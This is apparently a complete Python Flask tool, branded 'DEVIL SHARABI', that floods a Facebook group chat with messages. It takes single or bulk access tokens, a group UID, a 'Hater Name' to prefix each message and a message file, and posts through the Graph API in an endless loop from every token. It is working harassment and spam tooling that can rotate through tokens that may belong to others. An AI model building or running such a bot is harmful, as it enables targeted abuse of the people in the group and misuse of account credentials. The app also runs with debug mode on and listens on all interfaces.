from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64)...',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}
thread_task_map = {}  # Thread UID से Task Mapping

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Failed From token {access_token}: {message}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread_task_map[thread_id] = task_id  # UID से Task Map
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started for Thread ID: {thread_id}'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>𝗗𝗘𝗩𝗜𝗟 𝗦𝗛𝗔𝗥𝗔𝗕𝗜</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    label { color: white; }
    .file { height: 30px; }
    body {
        background: url('https://iili.io/3hK9Vqv.md.jpg') no-repeat center center fixed;
        background-size: cover;
        color: white;
        font-family: 'Segoe UI', sans-serif;
    }
    .container {
        max-width: 450px;
        margin-top: 30px;
        border-radius: 20px;
        padding: 30px;
        background-color: rgba(0, 0, 0, 0.85);
        box-shadow: 0 0 25px #ff5733;
    }
    .form-control {
        background: transparent;
        border: 1.5px solid #ff5733;
        color: white;
        margin-bottom: 15px;
        border-radius: 10px;
    }
    .btn-primary {
        background-color: #ff5733;
        border: 1px solid #ff5733;
        border-radius: 30px;
        font-weight: bold;
    }
    .btn-primary:hover {
        background-color: #ff7043;
        border-color: #ff7043;
    }
    .btn-danger {
        background-color: #c0392b;
        border: 1px solid #c0392b;
        border-radius: 30px;
        width: 100%;
        font-weight: bold;
    }
    .btn-danger:hover {
        background-color: #e74c3c;
    }
    .social-links {
        margin-top: 15px;
    }
    .social-links a {
        display: inline-block;
        margin: 10px;
        text-decoration: none;
        font-weight: bold;
    }
    .social-links .btn {
        border-radius: 30px;
        padding: 10px 20px;
        font-size: 16px;
    }
    footer {
        margin-top: 20px;
        font-size: 14px;
        font-weight: bold;
        text-shadow: 1px 1px #000;
        color: #ff5733;
    }
  </style>
</head>
<body>
  <div class="container text-center">
    <h2>𝗗𝗘𝗩𝗜𝗟 𝗦𝗛𝗔𝗥𝗔𝗕𝗜</h2>
    <form method="post" enctype="multipart/form-data">
      <select class="form-control" name="tokenOption" onchange="toggleTokenInput()" required>
        <option value="single">Single Token</option>
        <option value="multiple">Token File</option>
      </select>
      <div id="singleTokenInput">
        <input type="text" class="form-control" name="singleToken" placeholder="Enter Token">
      </div>
      <div id="tokenFileInput" style="display:none;">
        <input type="file" class="form-control" name="tokenFile">
      </div>
      <input type="text" class="form-control" name="threadId" placeholder="Enter Group UID" required>
      <input type="text" class="form-control" name="kidx" placeholder="Enter Hater Name" required>
      <input type="number" class="form-control" name="time" placeholder="Time Interval (seconds)" required>
      <input type="file" class="form-control" name="txtFile" required>
      <button type="submit" class="btn btn-primary mt-2">Start</button>
    </form>

    <hr style="border-color: white;">

    <form method="post" action="/stop">
      <input type="text" class="form-control" name="threadId" placeholder="Enter Group UID to Stop" required>
      <button type="submit" class="btn btn-danger mt-2">Stop</button>
    </form>

    <div class="social-links">
      <a href="https://wa.me/your_number_here" class="btn btn-success"><i class="fab fa-whatsapp"></i> WhatsApp</a>
      <a href="https://facebook.com/your_profile_here" class="btn btn-primary"><i class="fab fa-facebook-f"></i> Facebook</a>
    </div>

    <footer>
      𝐓𝐇𝐄 𝐏𝐎𝐖𝐄𝐑𝐃 𝐁𝐘 𝐌𝐑 𝐃𝐄𝐕𝐈𝐋 𝟐𝟎𝟐𝟓
    </footer>
  </div>

  <script>
    function toggleTokenInput() {
      var option = document.querySelector('[name="tokenOption"]').value;
      document.getElementById("singleTokenInput").style.display = (option === "single") ? "block" : "none";
      document.getElementById("tokenFileInput").style.display = (option === "multiple") ? "block" : "none";
    }
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    thread_id = request.form.get('threadId')
    task_id = thread_task_map.get(thread_id)

    if task_id and task_id in stop_events:
        stop_events[task_id].set()
        return f'Thread ID {thread_id} पर भेजे जा रहे मैसेज रोक दिए गए हैं।'
    else:
        return f'Thread ID {thread_id} से जुड़ा कोई Active Task नहीं मिला।'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
